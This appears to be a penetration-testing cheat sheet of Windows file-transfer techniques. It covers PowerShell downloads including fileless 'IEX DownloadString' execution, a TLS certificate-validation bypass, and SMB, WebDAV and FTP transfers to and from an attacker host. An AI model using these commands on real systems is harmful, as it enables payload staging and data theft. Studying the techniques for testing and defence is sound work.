#  Windows Transfer
```table-of-contents
```
## PowerShell Downloads
### Invoke-WebRequest (iwr)
```powershell
# Standard Download
Invoke-WebRequest http://<IP>/file.exe -OutFile file.exe

# Bypass "Internet Explorer Engine" error (older PS)
Invoke-WebRequest http://<IP>/file.exe -UseBasicParsing -OutFile file.exe
```
### System.Net.WebClient (Fast & Flexible)
```powershell
# Download File
(New-Object Net.WebClient).DownloadFile('http://<IP>/file.exe', 'C:\Temp\file.exe')

# Download String (Fileless Execution)
IEX (New-Object Net.WebClient).DownloadString('http://<IP>/script.ps1')

# Async Download (Non-blocking)
(New-Object Net.WebClient).DownloadFileAsync('http://<IP>/file.exe', 'file.exe')
```
### Common Errors Fix (SSL/TLS)
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
## PowerShell Remoting (WinRM)
### 1. Create Session
```powershell
$Session = New-PSSession -ComputerName <TARGET_IP>
```
### 2. Copy Files (Copy-Item)
```powershell
# Upload (Local -> Remote)
Copy-Item -Path C:\local\file.exe -ToSession $Session -Destination C:\Windows\Temp\

# Download (Remote -> Local)
Copy-Item -Path "C:\Windows\Temp\secret.txt" -Destination C:\local\ -FromSession $Session
```
## RDP Transfers
### Drive Sharing (Linux -> Windows)
**rdesktop:**
```shell
rdesktop <IP> -u user -p pass -r disk:sharename='/home/kali/tools'
```
**xfreerdp:**
```shell
xfreerdp /v:<IP> /u:user /p:pass /drive:sharename,/home/kali/tools
```
**Accessing on Windows:** Open Explorer and browse to `\\tsclient\sharename`.
## SMB Transfers
```powershell
# Standard Copy
copy \\<ATTACKER_IP>\share\file.exe C:\Windows\Temp\file.exe

# Mount Drive (If unauthenticated access is blocked)
net use Z: \\<ATTACKER_IP>\share /user:test test
copy Z:\file.exe C:\Windows\Temp\file.exe
```
## WebDAV Transfers
```powershell
# Copy from WebDAV
copy \\<ATTACKER_IP>\DavWWWRoot\file.exe C:\Windows\Temp\file.exe

# Upload to WebDAV
copy C:\local\file.exe \\<ATTACKER_IP>\DavWWWRoot\
```
## FTP Transfers
```powershell
echo open <ATTACKER_IP> > ftp.txt
echo USER anonymous >> ftp.txt
echo binary >> ftp.txt
echo GET file.exe >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```